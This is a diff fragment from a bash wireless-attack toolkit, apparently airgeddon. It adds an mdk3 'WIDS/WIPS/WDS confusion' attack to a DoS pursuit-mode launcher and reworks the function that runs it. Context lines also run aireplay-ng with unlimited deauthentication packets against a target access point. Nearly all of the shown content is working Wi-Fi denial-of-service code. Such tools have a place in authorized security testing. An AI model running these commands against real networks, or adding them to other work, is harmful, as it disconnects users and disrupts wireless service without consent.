@@ -2750,8 +2750,10 @@ function launch_dos_pursuit_mode_attack() {
 		;;
 		"aireplay deauth attack")
 			${airmon} start "${interface}" "${channel}" > /dev/null 2>&1
-			recalculate_windows_sizes
 			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e aireplay-ng --deauth 0 -a "${bssid}" --ignore-negative-one "${interface}" > /dev/null 2>&1 &
+		;;
+		"wids / wips / wds confusion attack")
+			xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "${1}" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1 &
 		;;
 	esac
 
@@ -2863,11 +2865,22 @@ function exec_wdsconfusion() {
 	language_strings "${language}" 91 "title"
 	language_strings "${language}" 32 "green"
 
+	tmpfiles_toclean=1
+
 	echo
-	language_strings "${language}" 33 "yellow"
-	language_strings "${language}" 4 "read"
-	recalculate_windows_sizes
-	xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+	if [ "${dos_pursuit_mode}" -eq 1 ]; then
+		language_strings "${language}" 506 "yellow"
+		language_strings "${language}" 4 "read"
+
+		dos_pursuit_mode_pids=()
+		launch_dos_pursuit_mode_attack "wids / wips / wds confusion attack" "first_time"
+		pid_control_pursuit_mode "wids / wips / wds confusion attack"
+	else
+		language_strings "${language}" 33 "yellow"
+		language_strings "${language}" 4 "read"
+		recalculate_windows_sizes
+		xterm +j -bg black -fg red -geometry "${g1_topleft_window}" -T "wids / wips / wds confusion attack" -e mdk3 "${interface}" w -e "${essid}" -c "${channel}" > /dev/null 2>&1
+	fi
 }
 
 #Execute Beacon flood DoS attack
